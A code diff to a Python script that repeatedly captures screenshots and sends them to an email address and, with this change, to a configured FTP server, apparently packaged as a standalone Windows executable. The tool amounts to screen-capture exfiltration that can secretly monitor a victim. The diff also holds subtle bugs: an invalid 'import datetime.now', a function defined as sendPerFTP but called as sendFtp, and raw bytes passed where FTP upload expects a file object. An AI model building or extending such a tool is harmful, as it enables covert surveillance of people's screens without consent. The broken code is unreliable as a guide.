@@ -1,7 +1,10 @@
+import datetime.now
 import smtplib
+import ftplib
 import json
 import sys
 import io
+
 
 
 import pyscreenshot as ImageGrab
@@ -22,21 +25,14 @@ except ImportError:
     import multiprocessing.forking as forking
 
 if sys.platform.startswith('win'):
-    # First define a modified version of Popen.
     class _Popen(forking.Popen):
         def __init__(self, *args, **kw):
             if hasattr(sys, 'frozen'):
-                # We have to set original _MEIPASS2 value from sys._MEIPASS
-                # to get --onefile mode working.
                 os.putenv('_MEIPASS2', sys._MEIPASS)
             try:
                 super(_Popen, self).__init__(*args, **kw)
             finally:
                 if hasattr(sys, 'frozen'):
-                    # On some platforms (e.g. AIX) 'os.unsetenv()' is not
-                    # available. In those cases we cannot delete the variable
-                    # but only set it to the empty string. The bootloader
-                    # can handle this case.
                     if hasattr(os, 'unsetenv'):
                         os.unsetenv('_MEIPASS2')
                     else:
@@ -65,7 +61,10 @@ def main(argv):
            +str(config['delay'])
            +' seconds'))
 
-        sendMail(getScreenshot())
+        if(config['sendEmail']):
+            sendMail(getScreenshot())
+        if(config['sendFtp']):
+            sendFtp(getScreenshot())
         sleep(config['delay'])
 
 def getScreenshot():
@@ -75,6 +74,11 @@ def getScreenshot():
     imageValue = imageBuffer.getvalue()
     imageBuffer.close()
     return imageValue
+
+def sendPerFTP(imgBuffer):
+    session = ftplib.FTP(config['ftpServer'],config['ftpUsername'],config['ftpPassword'])
+    session.storbinary('STOR screenshot_'+datetime.datetime.now().strftime("%Y-%m-%d_%H:%M:%S"), imgBuffer)
+    session.quit()
 
 def sendMail(imgBuffer):
     # Define message
@@ -88,10 +92,8 @@ def sendMail(imgBuffer):
     image = MIMEImage(imgBuffer, name='screenshot.png')
     message.attach(image)
 
-    # Log in yadda yadda
-    server.login(config['username'], config['password'])
+    server.login(config['emailUsername'], config['emailPassword'])
 
-    # Send Mail
     server.sendmail(config['email'], config['targetMail'], message.as_string())
 
 if __name__ == '__main__':
